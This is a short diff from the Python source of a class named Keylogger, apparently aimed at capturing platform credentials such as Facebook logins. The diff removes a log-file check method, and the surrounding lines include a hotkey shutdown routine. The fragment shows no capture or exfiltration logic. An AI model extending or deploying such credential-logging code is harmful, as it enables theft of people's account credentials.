@@ -79,15 +79,6 @@ class Keylogger:
     def update_platform_count(self):
         self.platform_count = self.platform_count + 1
 
-    def check_platform_file(self, platform_type: CredentialType):
-        if platform_type == CredentialType.FACEBOOK:
-            f = Path(self.log_file_path)
-            if f.is_fifo():
-                return True
-            new_file = open(self.log_file_path, "x")
-            new_file.close()
-            return None
-
     def __hotkey_shutdown(self):
         hlog = Logger()
         hlog.km_info("Hotkey activated, shutting down keylogger")
